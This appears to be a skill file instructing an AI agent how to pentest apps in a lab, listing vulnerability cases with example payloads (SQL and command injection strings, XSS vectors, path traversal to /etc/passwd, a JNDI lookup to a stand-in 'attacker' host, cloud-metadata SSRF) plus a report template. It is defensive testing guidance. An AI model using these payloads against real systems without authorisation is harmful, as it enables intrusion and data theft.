---
name: cyber
description: For cyber team. Dont load unless asked.
---

# Cyber Security Testing

How to test an app and write up the result.
- Work a target against the case catalogue below (or an unlisted one you've spotted)
- Try to reach a goal (a payload that actually executes in the target's context)
- Then record the outcome as a md.

The loop, in short: **pick a surface → pick cases → fire payloads until one reaches its goal → record evidence or lack-of → write the report.**

## Best Practices

First get to know your local resources, and which ones are on the tables to pentest. Ask first if you intend to reach resources beyond the stated list.

Existing keys test out to be pointing to a localhost/test/development resource. Raise and fix first if the lab is wrongly configured.

If you make a local webserver as a lab endpoint, place it in `./cve/lab-server/`. Reuse the lab server and tweak for future runs.

## The Goal

The Cases list are represent some known vectors that you might find. And if you do find one, it could either be entirely harmless, or reveal a critical flaw.

When pentesting, payloads you craft should always be harmless. Send them as the bad actor client, and observe on the server logs whether the server API handled odd cases gracefully, or let you do something it didn't expect. You may need to build in /debug instrumentation in the server code or run a lab webserver to actually observe it's effect.

Examples:
- **Node Server:** `console.log("Hi!")`, `console.log(fs.readFileSync("/home/username/.bashrc"))`, `... exec("man grep")`
- **Shell / command injection:** `echo "Hi!"`, `touch /home/username/hi`
- **SQL:** ` OR '1'='1'; UNION SELECT table_name`
- **Expression injection where unexpected:** `{{7*7}}` (renders `49`)
- **Path traversal:** read a known canary file (`../../etc/profile`)
- **SSRF:** the server reaches a callback canary you control
- **ReDoS:** `(a+)+$` bait (30×`a` then `!`) takes ~1000× longer than an equally long benign string.

A payload that reaches its goal is a confirmed finding and is written up as `report-risk.md`. A payload that never reaches its goal, across every surface and every payload you tried, is written up as `report-safe.md`, with the evidence of what you tried.

## Input Streams vs Tokens

Structured input (a request, JSON, CSV, an upload, an expression) is an input stream: it needs a real parser (lexer + grammar) to become tokens. Regex belongs *inside* a token ("begins with `ghp_`"), never in the lexer's seat. A token that is itself a language (a query, template, cron spec) needs a parser again.

Observe per surface: **parsed by a real parser, or dissected by regex?** Regex standing in for a parser means the input's language was never defined, and every downstream reader becomes a parser differential (cases 14–15). That input is a priority surface.

## Common Vulnerability Cases

For every input, the defaults are **too long, too short, empty, wrong type, and malicious characters**; for every object, ask **"am I allowed to see/change this?"**.

### 1. Input validation & boundaries

- **Oversized input:** a 257-char password, 1MB in a "name" field, a 10,000-char URL. Does it truncate gracefully, reject, or overflow a buffer / blow past a length check?
- **Empty and null:** blank field, `null`, `0`, just whitespace. Does "required" logic actually reject them?
- **Boundary values:** exactly at the limit (255), one over (256), one under (254). Off-by-one bugs live here.
- **Numeric extremes & negatives:** negative numbers, `0`, very large numbers, floats like `1e309` (infinity), `NaN`. Overflow wraps negative; an order of `-5` breaks quantity/price math and refunds.
- **Whitespace & control chars:** leading/trailing spaces, tabs, `\n`, `\r\n`, null bytes (`%00` / `\x00`) to terminate strings early.
- **Unicode / multibyte:** emoji, right-to-left override, combining marks, homoglyphs (lookalike letters) to spoof usernames or bypass filters.
- **Duplicate / repeated data:** double-submitting, resending a request, submitting the same unique field twice.

### 2. Injection & escape characters

- **SQL injection:** `'`, `;`, `--`, `/* */`, `' OR '1'='1'`. Test API parameters that reaches a database.
- **Closing sentinels:** `';`, `')`, `";`, `}`, `]]>`, `</script>`. Anything that closes a quote/bracket and appends more.
- **Command injection:** `;`, `&&`, `||`, `|`, backtick `` ` ``, `$()`, newline-separated commands in anything that reaches a shell or exec call.
- **XSS:** `<script>`, `<img onerror=...>`, `javascript:` URLs, event handlers (`onload`, `onmouseover`). Setup a lab webserver and test anywhere input is echoed into a page.
- **Path traversal:** `../`, `..\`, `../../etc/passwd`, absolute paths against file upload/download/read features. Encoded variants are case 15's differential.
- **Header/CRLF injection:** `\r\n` in any value that ends up in an HTTP header (redirect URL, filename).
- **XML/XXE:** doctype and external entity declarations if XML is parsed.

### 3. Authentication & sessions

- **Password policy edges:** max length, min length, complexity, leading/trailing spaces, unicode passwords.
- **Brute force / rate limiting:** hammer login, OTP, or reset endpoints; is there throttling or lockout?
- **Lockout abuse:** can a lockout DoS a victim's account? Does the lockout message leak account existence?
- **Session handling:** fixation (does login reuse an old session ID?), expiry, logout actually invalidating, cookies missing `HttpOnly` / `Secure` / `SameSite`.
- **Password reset flow:** predictable tokens, tokens that don't expire, reset that logs you in without re-auth, guessable "security questions".

### 4. Authorization

- **IDOR:** change `?id=1234` to `?id=1235` and see if you can read/edit someone else's record.
- **Privilege escalation:** a normal user hitting an admin endpoint, or changing `role=user` to `role=admin` in a request.
- **Missing function-level checks:** API endpoints, hidden pages, or internal-only routes that don't verify permissions.

### 5. Error handling & information oracles

- **Verbose errors:** stack traces, SQL queries, file paths, framework versions leaking in error messages.
- **Response-time oracle:** a measurable timing or size difference reveals hidden state. A login that answers faster for a nonexistent username than a real one lets an attacker enumerate accounts; password-prefix correctness can leak the same way.
- **Default/leftover content:** debug mode on, admin/test accounts, default creds, exposed `.git`, `robots.txt` paths, backup files (`.bak`, `~`).

### 6. File uploads

- **Type bypass:** `shell.php` → `shell.php.jpg`, spoofed MIME, magic bytes, double extension.
- **Size limits:** huge files to exhaust disk/memory.
- **Malicious content:** polyglot files, embedded scripts, SVG with XSS.

### 7. Logic, business rules & races

- **Check-then-act (TOCTOU):** the check and the action it gates are not atomic, so state changes in between. Two withdrawals both pass the "has funds" check before either debit lands, spending the same balance twice.
- **Order of operations:** discount after tax, stack a coupon multiple times.
- **Workflow skipping:** jump to checkout step 3, or approve your own request.

### 8. Fail-open & unverified metadata

The guard *does* run, but it believes things it should have verified.

- **Error treated as success:** a failure return value is accepted as a pass. A password over 256 bytes makes `crypt()` return `*` (its error marker), which a passwordless account also stores, so the two match and login succeeds.
- **Trusted metadata, unverified:** a field that should be checked is simply believed. A JWT whose header says `alg: none` is accepted with no signature, or `RS256` swapped to `HS256` reuses the public key as the HMAC secret.

### 9. Memory safety / bounds in native code

- **Unchecked length:** a client-supplied size is trusted without validation, so a read or write runs past the buffer. A heartbeat that claims 64KB but carries 1 byte makes the responder read 64KB of adjacent memory.

### 10. Cryptography & randomness

- **Predictable randomness or hardcoded keys:** a key, IV, or token comes from a weak source or is fixed in code. A session token drawn from a seeded `rand()` can be guessed ahead of time.
- **Nonce reuse ("two-time pad"):** the same nonce/IV for two messages reuses the keystream, so `C1 XOR C2 = P1 XOR P2`; with one known plaintext you recover the keystream and decrypt the rest. Reusing an AES-GCM nonce leaks the authentication key, enabling forged messages.

### 11. Untrusted data evaluated

- **Deserialization / expression / templates:** data reaches a serializer, expression language, or template that evaluates it. A log line of `${jndi:ldap://attacker/}` makes the logger look up a remote address.
- **Prototype pollution:** a merge or assign treats `__proto__` as a writable key, changing every object of that type. Deep-merging a request body that holds `{"__proto__": {"polluted": true}}` pollutes the base object globally.

### 12. SSRF (server-side request forgery)

- **Server fetches attacker URL:** a feature lets the server request a URL the client controls, reaching internal services. An image-import endpoint pointed at `http://x.x.x.x/latest/meta-data/` returns the instance's cloud credentials.

### 13. Known-vulnerable components

- **Known CVEs:** fingerprint what the target runs (lockfile, source maps, response headers), look up the known vulnerabilities for those exact versions, then probe the app for each. A CVE whose payload reaches its goal is a confirmed finding; one that doesn't is recorded as tried. Reuse the CVE code and casename if they exist.

### 14. Regex in place of a parser

Regular expressions doing a lexer's job: flat pattern-matching where a grammar belongs.

- **Catastrophic backtracking (ReDoS):** a regex with nested or overlapping quantifiers (`(a+)+$`) meets a string that almost matches then fails (`aaaa…!`), forcing exponential re-exploration.
- **Regex blacklist as the only guard:** a "reject bad characters" regex is the sole defense on SQLi/XSS/shell input. It speaks its own dialect of anchoring, charsets, and line-endings, so encodings and comment splicing (`/**/`) walk past it. Python's `$` matches before a trailing `\n`, so a `^\d+$` guard passes `"123\n"` that the next component rejects.

### 15. Parser differentials

Two components parse the same bytes and disagree. The request is valid to both, but each reads a different request. The last parser wins.

- **HTTP request smuggling:** front-end and backend disagree on `Content-Length` vs `Transfer-Encoding`: the terminating chunk ends one parser's request mid-stream and not the other's, so a smuggled prefix lands in the next victim's request.
- **Duplicate keys:** `{"role": false, "role": true}`: one runtime keeps the first key, another the last, so the signer and the verifier of the same body parse different documents.
- **Null-byte disagreement:** one component's string handling stops at `\0`, another's doesn't. `www.mysite.com\0.attacker.com` validates as the attacker's host while the display shows `www.mysite.com`; `shell.php\x00.jpg` truncates differently at the validator and the filesystem.
- **Encoding as a second parser:** double encoding (`%2527` → `%27` → `'`), mixed case (`%2f` vs `%2F`), base64/hex/`\u0027`-wrapped input: every decode layer is another parser whose output the earlier validator never saw.
- **Path / URL normalization:** the server resolves a request path without collapsing encoded traversal. `GET /%2e%2e/%2e%2e/etc/passwd` escapes the document root and returns a system file.
- **Roundtrip mutation:** parse → serialize → re-parse changes the meaning. A sanitizer's output mutates when the browser re-parses it (mXSS); compilers accept bidi control characters that make a human read different code than what executes (Trojan Source).

---

## Core principle

Don't only test the happy path "rejects bad input." Test what happens when the **machinery itself** errors, races, mis-parses, or trusts a length/flag/algo field it didn't fully validate. There doesn't need to be an exotic injection; an error code colliding with a sentinel value is enough. A regex doing a parser's job is the same disease one step earlier: the machinery never had a defined language, so there is no happy path to test, only the accidents.

## Classification

### Step 1: Classify the data involved
| Class | Examples |
|---|---|
| High | Credentials, PII, secrets; anything whose exposure violates policy/law or aids further attack |
| Low | Cache hit counts, non-sensitive telemetry |
| Public | Source maps, robots.txt, files intended for full public consumption |

### Step 2: Rate the risk level from actor capability
| Level | Definition |
|---|---|
| Critical | Arbitrary code execution or full host takeover |
| High | Read access to High-class data or write access to app state |
| Medium | Availability impact only (service degradation, ReDoS) |
| Low | Exposure of Low-class data only, no further capability |
| Safe | No meaningful impact |

## Reporting

A test ends in one of:
- 1 file, `report-safe.md`
- Or if something was discovered, one file **`report-{level}-{casename}.md`** and its artifacts, per classification. Make a new folder per casename if multiple classifications were discovered. Reuse a casename and amend the document if it was the same case as before, just rediscovered. Reuse an officially known casename if that's the exact case discovered.

The report title should be: `INITIALS-### (casename if discovered) — <component / target>`
- Replace `INITIALS` with the app's initials or something short so we can tell it apart from our many apps.
- Fill in a casename if something was discovered.

The verdict is the first thing a reader sees, and it stands or falls on **independent lines of evidence**, not one. Aim for at least two or three that don't share an assumption.

### Building the evidence

- **One line = one independent reason.** If two lines both fail when a single assumption fails, they are one line. "Runtime mismatch," "no reachable code path," and "the decoder behaves like the patched build" are three because killing any one leaves the other two standing.
- **Code plus live.** Static reading says a path *should* behave; a probe shows it *does*. Record both, and give the probe a table of payloads with the result and the post-probe state each left.
- **Record what you didn't do.** Footnotes are where untested vectors and scope limits live, so the verdict isn't read as broader than it is.

### Template

```markdown
# <INITIALS-### (casename)> — <component / target>

- **Risk:** <risk level>
- **Date:** YYYY-MM-DD
- **Target:** <host:port>, <runtime / framework>, version <x.y.z>

## Verdict

**<one bold sentence: vulnerable / not amongst the vulnerable>.** <remediation, or "no remediation required", scoped to the surface tested>

<Number> independent lines of evidence:

### 1. <line of evidence>

### 2. <line of evidence>

### 3. <line of evidence>

## Footnotes

- <assumptions, scope limits, anything that would change the verdict>

## Files

| File | What it is |
|---|---|
| `<payload / probe artifacts>` | <what each one is> |

**Rerun:** <the command(s) that reproduces the found casename>
```
